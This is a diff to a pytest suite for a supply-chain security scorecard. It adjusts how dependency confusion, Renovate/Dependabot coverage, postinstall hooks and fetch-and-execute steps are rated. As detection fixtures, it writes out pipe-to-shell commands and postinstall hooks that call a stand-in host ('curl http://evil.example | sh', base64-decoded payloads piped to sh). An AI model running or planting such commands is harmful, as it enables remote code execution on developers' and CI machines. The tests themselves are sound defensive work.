@@ -215,11 +215,16 @@ def test_dep_confusion_consuming_scoped_package_is_not_a_control():
     # the old ``@\w+/`` recon heuristic granted nearly every npm repo an
     # undeserved Partial.
     res = asc._eval_dependency_confusion("deps: @types/node, @babel/core", None)
-    assert res["effectiveness"] == asc.MISSING
+    assert res["effectiveness"] == asc.ADEQUATE
+    assert "does not apply" in res["reason"]
 
 
-def test_dep_confusion_none_missing():
-    assert asc._eval_dependency_confusion("public deps only", None)["effectiveness"] == asc.MISSING
+def test_dep_confusion_not_applicable_without_internal_packages():
+    # No internal package name means there is nothing for an attacker to squat,
+    # so the absence of a private registry is not a gap to report.
+    res = asc._eval_dependency_confusion("public deps only", None)
+    assert res["effectiveness"] == asc.ADEQUATE
+    assert "does not apply" in res["reason"]
 
 
 # --- _eval_postinstall -------------------------------------------------------
@@ -263,19 +268,20 @@ def test_postinstall_malformed_package_json_adequate(tmp_path):
 # --- _eval_dep_management ----------------------------------------------------
 
 
-def test_dep_management_renovate_file_partial(tmp_path):
+def test_dep_management_renovate_covering_everything_adequate(tmp_path):
+    # Renovate auto-detects every ecosystem unless enabledManagers restricts it.
     (tmp_path / "renovate.json").write_text("{}", encoding="utf-8")
     res = asc._eval_dep_management("", str(tmp_path))
-    assert res["effectiveness"] == asc.PARTIAL
+    assert res["effectiveness"] == asc.ADEQUATE
     assert "Renovate" in res["reason"]
 
 
-def test_dep_management_dependabot_file_partial(tmp_path):
+def test_dep_management_dependabot_covering_everything_adequate(tmp_path):
     gh = tmp_path / ".github"
     gh.mkdir()
     (gh / "dependabot.yml").write_text("version: 2", encoding="utf-8")
     res = asc._eval_dep_management("", str(tmp_path))
-    assert res["effectiveness"] == asc.PARTIAL
+    assert res["effectiveness"] == asc.ADEQUATE
     assert "Dependabot" in res["reason"]
 
 
@@ -441,8 +447,10 @@ def test_ci_install_mixed_npm_ci_and_npm_install_partial():
     assert res["effectiveness"] == asc.PARTIAL
 
 
-# N2 — the public registry is the npm default, not a control.
+# N2 — the public registry is the npm default, not a control. The repo publishes
+# a private package, so the control genuinely applies here.
 def test_dep_confusion_public_registry_is_not_protection(tmp_path):
+    (tmp_path / "package.json").write_text('{"name": "@acme/lib", "private": true}', encoding="utf-8")
     (tmp_path / ".npmrc").write_text("registry=https://registry.npmjs.org/\n", encoding="utf-8")
     assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.MISSING
 
@@ -545,14 +553,28 @@ def test_dep_management_uncovered_ecosystem_partial(tmp_path):
     assert "pip" in res["reason"]
 
 
-def test_dep_management_no_cooldown_partial(tmp_path):
+def test_dep_management_missing_cooldown_is_advice_not_a_downgrade(tmp_path):
+    # A missing install cooldown is a hardening opportunity, not a vulnerability:
+    # it belongs in the reason text, not in a downgraded rating.
     (tmp_path / "package.json").write_text("{}", encoding="utf-8")
     gh = tmp_path / ".github"
     gh.mkdir()
     (gh / "dependabot.yml").write_text('version: 2\nupdates:\n  - package-ecosystem: "npm"\n', encoding="utf-8")
     res = asc._eval_dep_management("", str(tmp_path))
-    assert res["effectiveness"] == asc.PARTIAL
+    assert res["effectiveness"] == asc.ADEQUATE
     assert "cooldown" in res["reason"]
+
+
+def test_dep_management_ignores_actions_and_docker_ecosystems(tmp_path):
+    # Both have dedicated sub-controls; counting them here would report the same
+    # gap twice and downgrade nearly every repo.
+    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
+    (tmp_path / "Dockerfile").write_text("FROM node:20\n", encoding="utf-8")
+    gh = tmp_path / ".github"
+    (gh / "workflows").mkdir(parents=True)
+    (gh / "workflows" / "ci.yml").write_text("on: push\n", encoding="utf-8")
+    (gh / "dependabot.yml").write_text('version: 2\nupdates:\n  - package-ecosystem: "npm"\n', encoding="utf-8")
+    assert asc._eval_dep_management("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
 
 
 # C1 — every FROM in every Dockerfile is graded.
@@ -573,3 +595,140 @@ def test_container_stage_alias_not_penalised(tmp_path):
         "FROM python:3.12@sha256:" + "b" * 64 + " AS build\nFROM build\n", encoding="utf-8"
     )
     assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+# --- Signal-over-noise refinements (2026-07-19) ------------------------------
+#
+# The scorecard is a threat-model input, not a SAST/IaC linter: a row may only
+# be downgraded for something that is genuinely exploitable. These tests pin the
+# cases that must stay quiet.
+
+
+def test_global_tool_install_does_not_downgrade_ci_install():
+    # `npm install -g @redocly/cli` in a lint job is CI tooling, not part of the
+    # product's dependency graph.
+    res = asc._eval_ci_install("run: npm ci\nrun: npm install -g @redocly/cli\n")
+    assert res["effectiveness"] == asc.ADEQUATE
+
+
+def test_public_extra_index_url_is_not_dependency_confusion():
+    # --extra-index-url to the PyTorch wheel index is on a large share of ML
+    # repos and is not a confusion setup.
+    res = asc._eval_dependency_confusion(
+        "run: pip install torch --extra-index-url https://download.pytorch.org/whl/cpu", None
+    )
+    assert res["effectiveness"] == asc.ADEQUATE
+
+
+def test_internal_extra_index_url_is_dependency_confusion():
+    res = asc._eval_dependency_confusion(
+        "run: pip install --extra-index-url https://pypi.acme.internal/simple pkg", None
+    )
+    assert res["effectiveness"] == asc.WEAK
+
+
+def test_husky_prepare_hook_is_not_a_finding(tmp_path):
+    (tmp_path / "package.json").write_text('{"scripts": {"prepare": "husky install"}}', encoding="utf-8")
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
+
+
+# --- fetch-and-execute of external resources ---------------------------------
+#
+# The highest-severity pattern the scorecard looks for: the fetched payload is
+# never recorded, so a change at the far end is silent and unreviewable.
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "curl -sSL https://get.example.com/install.sh | sh",
+        "curl https://x.io/install | sudo bash",
+        "wget -qO- https://example.com/s.py | python3",
+        'eval "$(curl -fsSL https://example.com/env)"',
+        "source <(curl -s https://example.com/fn.sh)",
+        "iex (New-Object Net.WebClient).DownloadString('https://x/p.ps1')",
+    ],
+)
+def test_fetch_and_execute_in_workflow_is_weak(tmp_path, step):
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text(f"jobs:\n  b:\n    steps:\n      - run: {step}\n", encoding="utf-8")
+    res = asc._eval_postinstall("", str(tmp_path))
+    assert res["effectiveness"] == asc.WEAK
+    assert "external URL" in res["reason"]
+
+
+def test_fetch_and_execute_in_dockerfile_detected(tmp_path):
+    (tmp_path / "Dockerfile").write_text(
+        "FROM node:20\nRUN curl -sL https://deb.nodesource.com/setup | bash -\n", encoding="utf-8"
+    )
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.WEAK
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "curl -sSL https://example.com/a.tgz -o a.tgz",  # downloaded, not executed
+        'curl -X POST -H "Auth: x" https://api.example.com/notify',  # API call
+        "curl -s https://api.example.com/v | jq -r .tag",  # piped to a parser
+        "wget https://example.com/tool.tar.gz && tar xzf tool.tar.gz",
+        "bash ./scripts/build.sh",  # local script
+        "npm ci",
+    ],
+)
+def test_legitimate_fetching_is_not_flagged(tmp_path, step):
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text(f"jobs:\n  b:\n    steps:\n      - run: {step}\n", encoding="utf-8")
+    assert asc._eval_fetch_and_execute("", str(tmp_path)) == []
+
+
+def test_commented_out_fetch_exec_is_not_flagged(tmp_path):
+    wf = tmp_path / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "ci.yml").write_text(
+        "jobs:\n  b:\n    steps:\n      - run: |\n          # curl https://x | sh\n          make build\n",
+        encoding="utf-8",
+    )
+    assert asc._eval_fetch_and_execute("", str(tmp_path)) == []
+
+
+# --- hook content classification: execution vectors only ---------------------
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "node scripts/fetch-assets.js",  # "fetch" in a filename is not a vector
+        "echo see https://docs.example.com",  # a URL in output is not a vector
+        "tsc -p .",
+        "patch-package",
+    ],
+)
+def test_benign_hook_content_is_not_escalated(tmp_path, command):
+    import json as _json
+
+    (tmp_path / "package.json").write_text(_json.dumps({"scripts": {"postinstall": command}}), encoding="utf-8")
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.PARTIAL
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl http://evil.example | sh",
+        "echo payload | base64 -d | sh",
+        "node -e \"require('https').get('http://evil.example')\"",
+    ],
+)
+def test_hook_execution_vectors_are_flagged(tmp_path, command):
+    import json as _json
+
+    (tmp_path / "package.json").write_text(_json.dumps({"scripts": {"postinstall": command}}), encoding="utf-8")
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.MISSING
+
+
+def test_setup_py_benign_cmdclass_is_not_escalated(tmp_path):
+    (tmp_path / "setup.py").write_text(
+        "from setuptools import setup\ncmdclass = {'build_ext': BuildExt}\n", encoding="utf-8"
+    )
+    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.PARTIAL
